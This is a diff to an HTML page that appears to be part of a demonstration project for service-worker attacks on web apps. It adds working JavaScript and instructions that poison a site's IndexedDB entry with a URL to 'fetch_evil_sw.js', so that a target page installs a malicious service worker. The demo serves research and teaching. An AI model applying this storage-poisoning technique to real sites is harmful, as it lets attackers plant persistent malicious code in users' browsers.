@@ -9,7 +9,6 @@
     <script src=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js></script>
     <link rel=stylesheet href=../../styles/main.css>
 	   <script type='text/javascript'>
-
             function register_sw(){
                  if('serviceWorker' in navigator) {
                       navigator.serviceWorker.register('./sw.js');
@@ -36,9 +35,10 @@
                }
 
               }
-            }
-          
-          
+            }          
+	  function show_div(){
+	  	document.getElementById('target_page').style.visibility = 'visible'
+	  }
           function modify_indexDB(){
               const request = indexedDB.open('demo_db', 1);
               request.onsuccess = (event) => {
@@ -50,16 +50,12 @@
                      var store = txn.objectStore('urls')
                      store.delete('report_url').onsuccess = ev => {
                          var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
-                       
+                       	 alert('DB poisoned!!')
                   }
               }
+	      show_div()
           }
 	  create_db()
-      function refresh_image(){
-            var url = document.getElementById("img-demo").getAttribute("src");
-          fetch(url)
-        	document.getElementById("img-demo").setAttribute("src", url);
-	  }
     </script>
   </head>
 <body>
@@ -75,19 +71,37 @@
 	<div>
 		<p>To test this attack, Follow the below steps</p>
 		<ol>
-      <li> Click the button below </li>
-		</ol>
-		
-		<input type="button" value="Click Me!!" onclick=modify_indexDB()>
+      			<li> Poison the IndexDB by executing Malcious code via XSS (simply invoke the malicious JS function)</li>
+			<li> Visit a target page that will install SW that will install script from poisoned URL </li>
+		</ol>		
+		<p>Below is the code to poison the db URL</p>
+		<pre class="snippet-code">
+			<code class="code-example js-subscription-json language-json">
+			function modify_indexDB(){
+			      const request = indexedDB.open('demo_db', 1);
+			      request.onsuccess = (event) => {
+				     var db = event.target.result;
+				     var txn = db.transaction('urls','readwrite')
+				     txn.onsuccess =  function(ev){
+					 alert('URL Modified!!. Reload Page')
+				     }
+				     var store = txn.objectStore('urls')
+				     // delete current record in DB and insert URL of malicious script
+				     store.delete('report_url').onsuccess = ev => {
+					 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
+				  }
+			      }
+			  }
+			</code>
+		</pre>
+		<input type="button" value="Execute Malicious Script!!" onclick=modify_indexDB()>
 		</div>
-
-	  <img id="img-demo" src='https://avatars0.githubusercontent.com/u/70142'/>
-		<button onclick=refresh_image()>Refesh Image</button>
-	   	 <a href="https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/scope2/index.html" class="btn btn-primary">Verify Attack!!</a>
+	    	<div id='target_page' style='visibility:hidden'>
+			<p>Click this link to visit the target page!!</p>
+			<a href="https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/scope2/index.html" class="btn btn-primary">Go to Target Page</a>
+	   	</div>
  	 <div>
 	</div>
-
-
   </main>
   </div>
   
